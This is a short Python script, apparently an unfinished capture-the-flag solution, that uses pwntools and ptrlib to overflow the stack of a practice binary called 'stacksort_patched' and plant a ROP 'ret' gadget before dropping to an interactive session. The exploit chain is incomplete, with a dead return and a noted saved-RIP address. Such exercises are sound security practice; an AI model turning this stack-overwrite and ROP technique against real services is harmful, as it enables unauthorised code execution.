#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./stacksort_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    rop_ret = next(exe.gadget("ret;"))

    for i in range(0xff):
        # io.sendlineafter(b": ", str(rop_ret).encode())
        io.sendlineafter(b": ", str(0).encode())

    input(">> ")
    io.sendlineafter(b": ", str(unwrap(exe.gadget("ret;"))).encode())
    io.interactive()
    return

    # &RIP = 0x7fffffffea48


if __name__ == "__main__":
    main()
